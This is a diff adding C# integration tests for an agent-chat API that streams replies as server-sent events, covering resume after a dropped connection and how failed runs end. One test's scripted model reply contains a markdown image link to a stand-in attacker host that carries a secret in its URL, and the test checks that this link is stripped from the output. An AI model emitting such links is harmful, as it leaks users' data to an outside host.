@@ -632,6 +632,79 @@ public sealed class AgentsAloneTests : IAsyncLifetime
     }
 
     [Fact]
+    public async Task A_chat_shows_its_reply_as_it_is_written_a_block_at_a_time_cleaned_and_a_reader_that_drops_picks_up_where_it_left_off()
+    {
+        // The model writes seven characters every tenth of a second, after one tool call; its reply has an image from elsewhere.
+        string agent = await SetUpAgentAsync("writer", """
+            demo: get_ticket {"key":"$ticket"}
+            demo-slow: 100
+            demo-answer: First paragraph.\n\n![leak](https://evil.example/x?d=secret)\n\nLast paragraph, a little longer than the others.
+            """);
+        string ticket = await TicketAsync(Ben, "DESK", "Streamed");
+        JsonElement chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = agent, ticket, prompt = "Tell me" });
+        string id = chat.GetProperty("chat").GetProperty("id").GetString()!;
+        Assert.Equal(System.Net.HttpStatusCode.NotFound, (await RawAsync(HttpMethod.Get, $"/api/agent-chats/{id}/events", Cy)).StatusCode);
+
+        string? stateAtFirstText = null;
+        List<(long Id, string Type, JsonElement Data)> events = await ChatEventsAsync(id, Ben, seen: async type =>
+        {
+            if (type == "text" && stateAtFirstText is null)
+            {
+                stateAtFirstText = (await SendAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben)).GetProperty("runs")[0].GetProperty("state").GetString();
+            }
+        });
+
+        // The first words showed while the model was still writing; then each step as it went, and the run's end.
+        Assert.Equal("running", stateAtFirstText);
+        Assert.Equal(events.Select(e => e.Id).Order(), events.Select(e => e.Id));
+        Assert.Equal(["turn", "step", "step", "turn"], events.Take(4).Select(e => e.Type));
+        Assert.Equal(["get_ticket", "get_ticket"], events.Where(e => e.Type == "step").Select(e => e.Data.GetProperty("tool").GetString()));
+        Assert.Equal(["done"], events.Where(e => e.Type == "step").Skip(1).Select(e => e.Data.GetProperty("outcome").GetString()));
+        Assert.Equal("run", events[^1].Type);
+        Assert.Equal("done", events[^1].Data.GetProperty("state").GetString());
+
+        // A block at a time, each cleaned before it was sent: joined, they're the reply the chat keeps.
+        List<string> texts = [.. events.Where(e => e.Type == "text").Select(e => e.Data.GetProperty("text").GetString()!)];
+        Assert.True(texts.Count >= 3);
+        Assert.DoesNotContain(texts, t => t.Contains("![leak](", StringComparison.Ordinal));
+        JsonElement kept = (await SendAsync(HttpMethod.Get, $"/api/agent-chats/{id}", Ben)).GetProperty("runs")[0];
+        Assert.Equal(kept.GetProperty("answer").GetString(), string.Concat(texts));
+
+        // A reader that dropped after the first text gets the rest, from there.
+        long first = events.First(e => e.Type == "text").Id;
+        List<(long Id, string Type, JsonElement Data)> rest = await ChatEventsAsync(id, Ben, after: first);
+        Assert.Equal(events.Where(e => e.Id > first).Select(e => e.Id), rest.Select(e => e.Id));
+
+        // The next message starts afresh: the chat's earlier events go.
+        JsonElement next = await SendAsync(HttpMethod.Post, $"/api/agent-chats/{id}/messages", Ben, new { prompt = "Again" });
+        await FinishedAsync(next.GetProperty("runs")[next.GetProperty("runs").GetArrayLength() - 1]);
+        List<(long Id, string Type, JsonElement Data)> again = await ChatEventsAsync(id, Ben);
+        Assert.True(again.Count > 0 && again.All(e => e.Id > events[^1].Id));
+    }
+
+    [Fact]
+    public async Task A_model_that_throws_or_a_reply_that_breaks_off_ends_the_run_with_the_error_and_keeps_no_answer()
+    {
+        string thrower = await SetUpAgentAsync("thrower", "demo-throw\ndemo-answer: Never.");
+        JsonElement chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = thrower, desk = "DESK", prompt = "Go" });
+        JsonElement run = await FinishedAsync(chat.GetProperty("runs")[0]);
+        Assert.Equal("failed", run.GetProperty("state").GetString());
+        Assert.Contains("its call failed (InvalidOperationException)", run.GetProperty("error").GetString(), StringComparison.Ordinal);
+        Assert.Equal(JsonValueKind.Null, run.GetProperty("answer").ValueKind);
+
+        // Text came before the break, but the reply isn't kept: the run's end says why, and the reader sees it end.
+        string breaker = await SetUpAgentAsync("breaker", "demo-break: 21\ndemo-answer: A long answer that is cut off well before its end.");
+        chat = await SendAsync(HttpMethod.Post, "/api/agent-chats", Ben, new { agentId = breaker, desk = "DESK", prompt = "Go" });
+        run = await FinishedAsync(chat.GetProperty("runs")[0]);
+        Assert.Equal("failed", run.GetProperty("state").GetString());
+        Assert.Equal("The model's reply broke off: The sample's model was cut off.", run.GetProperty("error").GetString());
+        Assert.Equal(JsonValueKind.Null, run.GetProperty("answer").ValueKind);
+        List<(long Id, string Type, JsonElement Data)> events = await ChatEventsAsync(chat.GetProperty("chat").GetProperty("id").GetString()!, Ben);
+        Assert.Equal("failed", events[^1].Data.GetProperty("state").GetString());
+        Assert.Equal(run.GetProperty("error").GetString(), events[^1].Data.GetProperty("error").GetString());
+    }
+
+    [Fact]
     public async Task A_chats_next_run_starts_marked_as_its_earlier_ones_and_waits_for_the_last_to_end()
     {
         // A chat about Ben's own ticket. The first message's run reads a customer's ticket; the second's reads only Ben's
@@ -868,6 +941,56 @@ public sealed class AgentsAloneTests : IAsyncLifetime
     private static List<string> Tools(JsonElement run) =>
         [.. run.GetProperty("steps").EnumerateArray().Where(s => s.GetProperty("kind").GetString() == "tool")
             .Select(s => $"{s.GetProperty("name").GetString()}:{s.GetProperty("outcome").GetString()}")];
+
+    /// <summary>A chat's events as its reader gets them, until the stream ends; each one's type handed to <paramref name="seen"/> as it comes.</summary>
+    private async Task<List<(long Id, string Type, JsonElement Data)>> ChatEventsAsync(string chat, string account, long? after = null,
+        Func<string, Task>? seen = null)
+    {
+        using HttpRequestMessage request = new(HttpMethod.Get, $"/api/agent-chats/{chat}/events");
+        request.Headers.Add("X-Account", account);
+        if (after is { } last)
+        {
+            request.Headers.Add("Last-Event-ID", last.ToString(System.Globalization.CultureInfo.InvariantCulture));
+        }
+
+        using HttpResponseMessage response = await _factory!.CreateClient().SendAsync(request, HttpCompletionOption.ResponseHeadersRead);
+        Assert.True(response.IsSuccessStatusCode, $"events: {(int)response.StatusCode}");
+        using StreamReader reader = new(await response.Content.ReadAsStreamAsync());
+        List<(long Id, string Type, JsonElement Data)> events = [];
+        (long id, string type, System.Text.StringBuilder data) = (0, "message", new System.Text.StringBuilder());
+        while (await reader.ReadLineAsync() is { } line)
+        {
+            if (line.Length == 0)
+            {
+                if (data.Length > 0 && type != "ping")
+                {
+                    using JsonDocument document = JsonDocument.Parse(data.ToString());
+                    events.Add((id, type, document.RootElement.Clone()));
+                    if (seen is not null)
+                    {
+                        await seen(type);
+                    }
+                }
+
+                (id, type) = (0, "message");
+                data.Clear();
+            }
+            else if (line.StartsWith("id:", StringComparison.Ordinal))
+            {
+                id = long.Parse(line[3..].Trim(), System.Globalization.CultureInfo.InvariantCulture);
+            }
+            else if (line.StartsWith("event:", StringComparison.Ordinal))
+            {
+                type = line[6..].Trim();
+            }
+            else if (line.StartsWith("data:", StringComparison.Ordinal))
+            {
+                data.Append(line[5..].TrimStart());
+            }
+        }
+
+        return events;
+    }
 
     private async Task<HttpResponseMessage> RawAsync(HttpMethod method, string path, string account, object? body = null)
     {
